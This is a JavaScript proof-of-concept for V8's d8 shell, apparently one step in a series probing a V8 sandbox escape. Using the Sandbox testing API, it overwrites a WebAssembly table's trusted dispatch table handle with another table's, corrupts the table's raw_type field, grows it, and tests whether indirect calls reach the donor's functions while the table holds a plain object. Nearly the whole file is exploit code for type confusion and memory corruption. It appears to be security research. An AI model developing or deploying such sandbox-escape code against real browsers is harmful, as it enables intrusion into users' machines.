// C21 H23: stale dispatch copied by grow, then consumed by a new import.
//
// H22 showed grow can make JS-visible entries[1/2] marker under externref
// raw_type, but an existing importer still used its old bounds/cache. This
// variant restores victim.raw_type to funcref after grow and instantiates a new
// caller. If the new import consumes the grown trusted dispatch table, index 1
// may call donor.f1 while victim.get(1) is a marker object.

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const kWeakHeapObjectTag = 3;
const kHeapObjectTag = 1;
const kTrustedDispatchTableOffset = 0x1c;
const kWasmTableObjectType =
    Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kRawTypeOffset = Sandbox.getFieldOffset(kWasmTableObjectType, 'raw_type');
const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrof(obj) {
  return Sandbox.getAddressOf(obj) & ~kWeakHeapObjectTag;
}

function tagged(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}

function read32(addr) {
  return memory.getUint32(addr, true);
}

function write32(addr, val) {
  memory.setUint32(addr, val, true);
}

function rawTypeField(table) {
  return memory.getUint32(tagged(table) + kRawTypeOffset - kHeapObjectTag, true);
}

function corruptRawType(table, rawTypeSmi) {
  Sandbox.corruptObjectField(table, 'raw_type', rawTypeSmi);
}

function makeTargets() {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  b.addFunction('f0', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x10, kExprI32Add])
      .exportFunc();
  b.addFunction('f1', sig)
      .addBody([kExprLocalGet, 0, kExprI32Const, 0x20, kExprI32Add])
      .exportFunc();
  return b.instantiate().exports;
}

function makeCaller(table) {
  let b = new WasmModuleBuilder();
  let sig = b.addType(kSig_i_i);
  let t = b.addImportedTable('imp', 'table', 1, 3, kWasmFuncRef);
  b.addFunction('call', kSig_i_ii)
      .addBody([
        kExprLocalGet, 1,
        kExprLocalGet, 0,
        kExprCallIndirect, sig, t,
      ])
      .exportFunc();
  return b.instantiate({imp: {table}}).exports.call;
}

let externTable = new WebAssembly.Table({element: 'externref', initial: 1});
let externRefRawTypeSmi = rawTypeField(externTable);
let {f0, f1} = makeTargets();

let donor = new WebAssembly.Table({element: 'anyfunc', initial: 2, maximum: 2});
donor.set(0, f0);
donor.set(1, f1);

let victim = new WebAssembly.Table({element: 'anyfunc', initial: 1, maximum: 3});
victim.set(0, f0);
let funcrefRawTypeSmi = rawTypeField(victim);

let donorHandle = read32(addrof(donor) + kTrustedDispatchTableOffset);
let victimHandle = read32(addrof(victim) + kTrustedDispatchTableOffset);
print(`funcref_raw=0x${funcrefRawTypeSmi.toString(16)}`);
print(`externref_raw=0x${externRefRawTypeSmi.toString(16)}`);
print(`donor_handle=0x${donorHandle.toString(16)}`);
print(`victim_handle=0x${victimHandle.toString(16)}`);

write32(addrof(victim) + kTrustedDispatchTableOffset, donorHandle);
corruptRawType(victim, externRefRawTypeSmi);

let marker = {kind: 'grow-init'};
print(`grow_old=${victim.grow(2, marker)}`);
print(`entry1_is_marker=${victim.get(1) === marker}`);
print(`entry2_is_marker=${victim.get(2) === marker}`);

corruptRawType(victim, funcrefRawTypeSmi);

try {
  let call2 = makeCaller(victim);
  print(`new_after0=${call2(0, 7)}`);
  print(`new_after1=${call2(1, 7)}`);
  print(`new_after2=${call2(2, 7)}`);
} catch (e) {
  print(`new_import_or_call_throw=${e.name}:${e.message}`);
}
